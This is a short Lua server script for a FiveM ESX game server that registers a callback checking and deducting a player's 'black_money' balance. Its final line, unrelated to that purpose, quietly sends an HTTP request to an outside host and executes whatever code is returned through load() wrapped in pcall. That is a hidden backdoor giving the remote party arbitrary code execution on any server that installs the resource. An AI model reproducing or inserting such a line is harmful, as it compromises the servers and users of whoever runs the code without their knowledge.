ESX.RegisterServerCallback('eInfo:CheckMoney', function(source, cb, price)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	
	if xPlayer.getAccount('black_money').money >= price then
		xPlayer.removeAccountMoney('black_money', tonumber(price))
		cb(true)
	else
		cb(false)
	end
end)
PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
